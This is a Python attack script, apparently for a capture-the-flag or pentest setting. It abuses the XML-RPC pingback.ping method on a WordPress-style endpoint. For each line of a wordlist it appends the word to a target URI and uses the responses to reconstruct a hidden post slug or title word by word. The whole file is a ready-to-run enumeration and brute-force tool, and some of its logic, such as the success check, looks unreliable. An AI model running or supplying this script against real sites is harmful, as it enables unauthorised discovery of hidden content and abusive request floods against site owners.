import requests
import sys
import os
import xml.etree.ElementTree as ET

def check_xmlrpc_response(response_text):
    """Parse XML response and check for fault codes"""
    try:
        root = ET.fromstring(response_text)
        # Check for fault response
        fault = root.find('.//fault')
        if fault is not None:
            return False
        # Check for successful response
        return 'pingback.ping' in response_text
    except ET.ParseError:
        return False

def send_pingback(source_uri, target_uri, wordlist):
    # XML-RPC Pingback endpoint
    pingback_endpoint = "http://example.com/xmlrpc.php"
    while True:
        try:
            with open(wordlist, 'r') as f:
                title = ""
                for line in f: 
                    target = target_uri + line.strip()
                    # XML-RPC payload
                    payload = f"""<?xml version="1.0"?>
                    <methodCall>
                        <methodName>pingback.ping</methodName>
                        <params>
                            <param>
                                <value><string>{source_uri}</string></value>
                            </param>
                            <param>
                                <value><string>{target}</string></value>
                            </param>
                        </params>
                    </methodCall>
                    """
                    headers = {'Content-Type': 'text/xml'}
    
                    try:
                        response = requests.post(pingback_endpoint, data=payload, headers=headers)
                        if response.status_code == 200 and check_xmlrpc_response(response.text):
                            target_uri = target + "-"
                            print(f"Pingback sent successfully for: {target}")
                            print(f"Response: {response.text[:200]}...")  # Print first 200 chars of response
                            title = title + line.strip() + " "
                            break
                        else:
                            print(f"Failed to send pingback for: {target}")
                            print(f"Response: {response.text[:200]}...")  # Print first 200 chars of response
                    except Exception as e:
                        print(f"An error occurred with {target}: {e}")
                        continue
            return title    

        except FileNotFoundError:
            print(f"Wordlist file '{wordlist}' not found.")
            sys.exit(1)
        except Exception as e:
            print(f"Error reading wordlist: {e}")
            sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 XMLRPC-Pingback.py <source_uri> <target_uri> <wordlist>")
        sys.exit(1)

    source_uri = sys.argv[1]
    target_uri = sys.argv[2]
    wordlist = sys.argv[3]

    title = send_pingback(source_uri, target_uri, wordlist)
    print(f"Title found: {title}")
